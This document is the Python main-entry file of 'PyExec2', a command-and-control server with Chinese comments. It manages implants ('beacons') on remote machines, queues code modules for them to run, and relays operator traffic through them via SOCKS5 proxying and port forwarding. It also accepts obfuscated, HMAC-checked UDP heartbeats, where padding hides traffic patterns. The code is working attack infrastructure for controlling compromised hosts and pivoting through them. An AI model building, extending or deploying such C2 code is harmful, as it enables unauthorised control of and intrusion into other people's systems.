"""
server/server.py — PyExec2 C2 Server 主入口（T4.5 重构）

生命周期（10.1）:
  - Server 自持 running / stop()；console 只是可选 UI 前端
  - 交互模式（默认，有 TTY）: console_loop
  - headless 模式: --headless，不启动 console，事件/日志走文件，用 Client 远程操作
  - Ctrl-C / console exit → stop() 优雅退出

装配（模块化边界清单）:
  - 基础设施: ClientManager / TaskQueue / EventWriter / ModuleLoader / ServerModuleLoader
  - 命令引擎: CommandContext + Dispatcher（console 与 Client 会话共用）
  - 网络层: Listener 双端口（implant / client，10.1 端口密钥分离）
"""

import argparse
import json
import logging
import os
import secrets
import socket
import sys
import threading
import time
from datetime import datetime

# 运行时从 server/ 目录启动（python3 server.py）：项目根入 sys.path
_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

# 目录名不叫 server 时（如仓库里叫 c2_server），把本包注册为 "server" 别名，
# 使 `from server.xxx import` 的内置导入在直接运行 python3 server.py 时也能解析
# （与 flowscan/c2_bridge.py 的别名逻辑一致）。
_PKG_DIR = os.path.dirname(os.path.abspath(__file__))
_PKG_NAME = os.path.basename(_PKG_DIR)
if _PKG_NAME != "server" and "server" not in sys.modules:
    try:
        import importlib as _importlib
        sys.modules["server"] = _importlib.import_module(_PKG_NAME)
    except Exception:
        pass  # 交给下方 import 报出原始错误

from server.core.config import load_config, ServerConfig, _is_hex64
from server.core.log import setup_logging, get_logger
from server.core.events import (
    EVT_SERVER_START, EVT_SERVER_STOP, EVT_DISCONNECT,
)
from server.client_manager import ClientManager
from server.task_queue import TaskQueue
from server.infra.event_writer import EventWriter
from server.module_loader import ModuleLoader
from server.listener import Listener
from server.sessions.beacon import BeaconSession
from server.sessions.client import ClientSession
from server.ui.console import Console, console_loop
from server.server_module_loader import ServerModuleLoader
from server.engine.dispatcher import Dispatcher, CommandContext

logger = get_logger("server")


def _ensure_implant_key(config: ServerConfig) -> bytes:
    """确保配置有有效 implant_key，否则自动生成并写回（10.1 兜底）。"""
    if _is_hex64(config.implant_key):
        return bytes.fromhex(config.implant_key)

    key = secrets.token_bytes(32)
    config_file = (os.path.join(config.base_dir, "config.json")
                   if config.base_dir else "config.json")
    logger.warning("implant_key 为空或无效，已自动生成 %s", key.hex())
    try:
        try:
            with open(config_file, "r", encoding="utf-8") as f:
                raw = json.load(f)
        except FileNotFoundError:
            raw = {}
        raw["implant_key"] = key.hex()
        with open(config_file, "w", encoding="utf-8") as f:
            json.dump(raw, f, indent=2)
        logger.info("implant_key 已写入 %s", config_file)
    except Exception as e:
        logger.error("写回 config 失败: %s", e)
    config.implant_key = key.hex()   # 回写内存，保持与磁盘一致（#7）
    return key


class PyExec2Server:
    """PyExec2 C2 Server。"""

    def __init__(self, config: ServerConfig, headless: bool = False):
        self._config = config
        self._headless = headless
        self._running = False
        self._udp_sock = None        # UDP 心跳监听（21）
        self._udp_thread = None

        self._key_implant = _ensure_implant_key(config)
        if _is_hex64(config.client_key):
            self._key_client = bytes.fromhex(config.client_key)
        else:
            self._key_client = b""
            if config.client_key:
                logger.warning("client_key 非法 hex，client 通道不可用。"
                               "请运行 s_exec keygen 重新生成。")
        if not config.client_key:
            logger.warning("client_key 为空，client 通道不可用。"
                           "请运行 s_exec keygen 生成。")

        # client 通道 TLS（防嗅探）：证书自动生成到 data/client_tls.*
        self._client_ssl_ctx = None
        if config.client_tls:
            self._client_ssl_ctx = self._make_client_tls_ctx(config)

        self._mgr = ClientManager()
        self._tq = TaskQueue(max_tasks_per_client=config.max_tasks_per_client)
        self._events = EventWriter(config.event_file)

        self._modules = ModuleLoader(
            modules_dir=config.modules_dir,
            max_task_code_size=config.max_task_code_size)
        self._modules.load()
        self._smods = ServerModuleLoader(
            modules_dir=config.server_modules_dir)

        # 命令引擎（ctx 组件 + on_exit 回调）
        self._ctx = CommandContext(
            mgr=self._mgr, tq=self._tq, logger=self._events,
            config=self._config, modules=self._modules, smods=self._smods,
            on_exit=self.stop,
        )
        self._dispatcher = Dispatcher(self._ctx)
        self._console = Console(self._dispatcher)

        # 中继通道（13/14）：socks5 动态代理 + 端口转发
        self._hub = None
        self._socks5 = None
        if config.relay_port and config.relay_port > 0:
            from server.infra.relay import RelayHub, Socks5Server
            self._hub = RelayHub(
                host=config.relay_host, relay_port=config.relay_port,
                tq=self._tq, modules=self._modules,
                fallback_beacon=lambda: self._dispatcher.current_beacon)
            self._dispatcher.hub = self._hub
            if config.socks5_port and config.socks5_port > 0:
                self._socks5 = Socks5Server(
                    config.relay_host, config.socks5_port, self._hub)

        self._listener: Listener | None = None
        self._cleanup_thread: threading.Thread | None = None

    # ── 生命周期 ──

    @property
    def running(self) -> bool:
        return self._running

    def start(self) -> None:
        """启动 Server（阻塞：交互模式跑 console，headless 等待 stop）。"""
        self._running = True
        self._events.emit(EVT_SERVER_START, "-",
                          port=self._config.server_port,
                          client_port=self._config.client_port)
        self._start_cleanup()
        self._start_listener()
        self._start_udp_heartbeat()
        if self._hub:
            self._hub.start()
            logger.info("relay listening %s:%d", self._config.relay_host,
                        self._config.relay_port)
        if self._socks5:
            self._socks5.start()
            logger.info("SOCKS5 listening %s:%d", self._config.relay_host,
                        self._config.socks5_port)

        if self._headless:
            logger.info("headless mode: 事件写 %s，运行日志见 log_file。"
                        "用 client 远程操作。", self._config.event_file)
            try:
                while self._running:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                logger.info("KeyboardInterrupt")
        else:
            try:
                console_loop(self._console)
            except KeyboardInterrupt:
                print("\n[*] KeyboardInterrupt, shutting down...")
        self.stop()

    def stop(self) -> None:
        """优雅停止：置位 → 关监听 → 停 UI → 记录事件。"""
        if not self._running and self._listener is None:
            return
        self._running = False
        if self._listener:
            self._listener.stop()
        if self._udp_sock:
            try:
                self._udp_sock.close()
            except OSError:
                pass
        if self._hub:
            try:
                self._hub.stop()
            except Exception:
                pass
        if self._socks5:
            try:
                self._socks5.stop()
            except Exception:
                pass
        if self._console:
            self._console.stop()
        self._events.emit(EVT_SERVER_STOP, "-")
        logger.info("server stopped")

    # ── 内部 ──

    def _start_listener(self) -> None:
        # 端口标识即协议角色（beacon/client，10.1 绑定校验用）
        ports = {
            "beacon": (self._config.server_port, self._key_implant),
            "client": (self._config.client_port, self._key_client),
        }
        self._listener = Listener(
            host=self._config.server_host,
            ports=ports,
            session_factory=self._make_session,
            max_connections=self._config.max_connections,
        )
        self._listener.start()

    def _start_udp_heartbeat(self) -> None:
        """UDP 心跳监听（21）：与 beacon 端口同端口的 UDP socket。

        长任务期间 beacon 端每 30s 发心跳包（<bid>\\x01），收到即刷新
        last_seen，show 不再误判离线。
        """
        if self._udp_sock:
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self._config.server_host, self._config.server_port))
            s.settimeout(1.0)
        except OSError as e:
            logger.warning("UDP 心跳监听启动失败（长任务期间可能误判离线）: %s", e)
            return
        self._udp_sock = s

        def _loop():
            while self._running:
                try:
                    data, _ = s.recvfrom(512)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if len(data) < 24:
                    continue
                # M4：心跳包 = <bid 16 字符 hex><填充 0-40B 可选><HMAC(_K, bid)[:8]>
                # ——bid 取固定 16 字节前缀,mac 取帧尾 8 字节,中间填充为
                # 流量混淆(2026-08-25)忽略;假心跳(纯随机)bid 前缀查不到或
                # MAC 校验失败,自然忽略。
                bid = data[:16].decode("ascii", "replace")
                mac = data[-8:]
                rec = self._mgr.get_client(bid)
                if rec is None:
                    continue
                import hashlib as _hl
                import hmac as _hm
                expect = _hm.new(self._key_implant, bid.encode(),
                                 _hl.sha256).digest()[:8]
                if not _hm.compare_digest(mac, expect):
                    continue
                rec.last_seen = datetime.now()

        self._udp_thread = threading.Thread(target=_loop, daemon=True)
        self._udp_thread.start()

    def _make_client_tls_ctx(self, config) -> "ssl.SSLContext":
        """生成/加载 client 通道证书，返回 server-side SSLContext。"""
        import ssl
        from server.s_modules.tls_util import generate_self_signed
        data_dir = os.path.join(config.base_dir, "data")
        os.makedirs(data_dir, exist_ok=True)
        cert_file = os.path.join(data_dir, "client_tls.crt")
        key_file = os.path.join(data_dir, "client_tls.key")
        if not (os.path.isfile(cert_file) and os.path.isfile(key_file)):
            try:
                generate_self_signed(config.server_host, data_dir)
                # generate_self_signed 写 proxy.{crt,key}，改名
                if os.path.isfile(os.path.join(data_dir, "proxy.crt")):
                    os.replace(os.path.join(data_dir, "proxy.crt"), cert_file)
                    os.replace(os.path.join(data_dir, "proxy.key"), key_file)
            except Exception as e:
                logger.error("client TLS 证书生成失败: %s（client 通道回落明文）", e)
                return None
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            ctx.load_cert_chain(cert_file, key_file)
        except Exception as e:
            logger.error("client TLS 证书加载失败: %s", e)
            return None
        return ctx

    def _make_session(self, conn: socket.socket, key: bytes,
                      expected_role: str):
        """按端口角色构造会话（T4.3/T4.4）。"""
        # client 通道 TLS 包装（beacon 通道不走 TLS——协议帧层不变）
        if expected_role == "client" and self._client_ssl_ctx:
            try:
                conn = self._client_ssl_ctx.wrap_socket(
                    conn, server_side=True)
            except Exception as e:
                logger.debug("client TLS wrap failed: %s", e)
                try:
                    conn.close()
                except OSError:
                    pass
                return None
        components = dict(
            mgr=self._mgr, tq=self._tq, logger=self._events,
            config=self._config, modules=self._modules, smods=self._smods,
            hub=self._hub,
        )
        if expected_role == "beacon":
            return BeaconSession(
                conn, key, expected_role,
                self._mgr, self._tq, self._events, self._config,
                self._modules, self._smods, dispatcher=self._dispatcher,
            )
        return ClientSession(conn, key, expected_role, components)

    def _start_cleanup(self) -> None:
        """后台清理线程：超时未回连的 beacon 移除（10.5 保洁）。"""

        def cleanup() -> None:
            while self._running:
                time.sleep(60)
                offline = self._mgr.get_offline_clients(
                    timeout=self._config.beacon_expire_seconds)
                for c in offline:
                    if c.active:
                        continue  # 活跃会话（正在执行任务）不清理
                    # M8：连任务队列一起清（此前队列残留，bid 复用会重放）
                    self._tq.clear(c.client_id)
                    self._mgr.remove_client(c.client_id)
                    self._events.emit(EVT_DISCONNECT, c.client_id,
                                      reason="timeout")
                    logger.info("beacon %s removed (timeout)", c.client_id[:8])

        self._cleanup_thread = threading.Thread(target=cleanup, daemon=True)
        self._cleanup_thread.start()


def main():
    parser = argparse.ArgumentParser(description="PyExec2 C2 Server")
    # 配置固定读 server/config.json（与 build/keygen 的读取一致）。
    # 不再支持 --config 指定其他文件：避免 build 读到不一致的 key
    # 导致新 implant 握手失败（S9）。
    parser.add_argument("--port", type=int, default=None)
    parser.add_argument("--host", default=None)
    parser.add_argument("--headless", action="store_true",
                        help="不启动交互控制台（无 TTY 部署）")
    parser.add_argument("--log-level", default="INFO",
                        choices=["DEBUG", "INFO", "WARNING", "ERROR"])
    args = parser.parse_args()

    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "config.json")
    try:
        config = load_config(config_path)
    except FileNotFoundError:
        print(f"[!] Config not found: {config_path}, creating default",
              file=sys.stderr)
        config = ServerConfig()
        defaults = {f.name: getattr(config, f.name)
                    for f in ServerConfig.__dataclass_fields__.values()
                    if f.name != "config_path"}
        with open(config_path, "w") as f:
            json.dump(defaults, f, indent=2)

    # --port/--host 覆盖先于 validate()：非法端口在 bind 前优雅报错退出
    if args.port:
        config.server_port = args.port
    if args.host:
        config.server_host = args.host

    problems = config.validate()
    if problems:
        # S7：任何配置问题都阻止启动——此前只对含 "port" 的退出，
        # max_frame_size:0 等坏配置会带着半瘫启动
        for p in problems:
            logger.error("config problem: %s", p)
        sys.exit(1)

    setup_logging(getattr(logging, args.log_level),
                  file=config.log_file if args.headless else None)

    server = PyExec2Server(config, headless=args.headless)
    server.start()


if __name__ == "__main__":
    main()
